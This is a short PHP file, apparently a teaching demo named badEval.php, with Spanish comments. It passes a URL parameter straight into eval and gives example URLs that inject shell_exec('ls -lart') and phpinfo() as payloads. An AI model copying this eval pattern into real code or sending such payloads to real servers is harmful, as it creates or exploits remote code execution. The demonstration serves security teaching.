<?php 

    //Se recibe el valor desde la URL por el metogo GET
    $x = $_GET["message"];
    @eval ("echo " . $x . ";");


/*
 * Caso de uso 1
 *
 * Mostrar un ls 
 * */
//Run:http://[Dirección de tu servidor]/badEval.php?message=1;echo%20shell_exec(%27ls%20-lart%27) 

/*
 * Caso de uso 2
 *
 * ejecutar phpinfo() 
 * */
//Run:http://[Dirección de tu servidor]/badEval.php?message=1;phpinfo() 
?>
